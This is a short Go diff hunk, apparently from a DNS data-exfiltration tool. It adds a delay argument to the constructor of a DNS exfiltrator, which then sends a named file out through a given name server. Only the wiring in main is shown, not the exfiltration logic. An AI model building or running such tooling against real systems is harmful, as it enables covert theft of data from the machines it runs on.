@@ -14,6 +14,6 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
-	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(args.NameServer, machineId)
+	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(args.NameServer, machineId, args.Delay)
 	dnsExfiltrator.ExfiltrateFile(args.Filename)
 }
